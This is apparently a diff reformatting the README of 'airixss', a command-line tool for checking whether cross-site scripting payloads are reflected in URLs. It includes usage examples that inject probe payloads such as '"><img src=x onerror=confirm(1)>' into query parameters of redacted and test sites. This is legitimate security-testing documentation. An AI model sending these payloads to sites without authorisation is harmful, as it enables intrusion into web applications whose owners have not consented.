@@ -32,27 +32,32 @@
     * Ex: https://redacted.com/index.php?msg=SameValue
   
   * By replacing the "SameValue" to a xss payload, In order to see if there is reflection/vulnerable, it is when you use airixss
-  <br>
+  
+* Lets say you have a url and you want to test reflection:
   <br>
   
-  * Lets say you have a url and you want to test reflection:
-  <br>
-  Airixss reads from stdin:
-  ```echo 'https://redacted.com/index.php?user="><img src=x onerror=confirm(1)>' | airixss -payload 'confirm(1)'```
-  <br>
-  <br>
-  In -payload flag, you need to specify a part of the payload used in url, -payload "value_will_be_checked_reflection"
+    Airixss reads from stdin:
   
-  **You can use a file containing a list of targets as well**:
+    `echo 'https://redacted.com/index.php?user="><img src=x onerror=confirm(1)>' | airixss -payload 'confirm(1)'`
+    <br>
   
-  ```cat targets | airixss -payload "alert(1)"```
+    In -payload flag, you need to specify a part of the payload used in url, -payload "value_will_be_checked_reflection"
   
+    <br>
+    
+    **You can use a file containing a list of targets as well**:
   
-  **You can make use of Airixss with other tools such gau, gauplus, waybackurls, qsreplace and bhedak**
-  <br>
-  * Another examples of usage:
-  ```echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>'```
-  ```echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"```
+    `cat targets | airixss -payload "alert(1)"`
+  
+    <br>
+    
+ * **You can make use of Airixss with other tools such gau, gauplus, waybackurls, qsreplace and bhedak**
+    <br>
+    * Another examples of usage:
+  
+    `echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>'`
+    <br>
+    `echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"`
 
 <br>
 
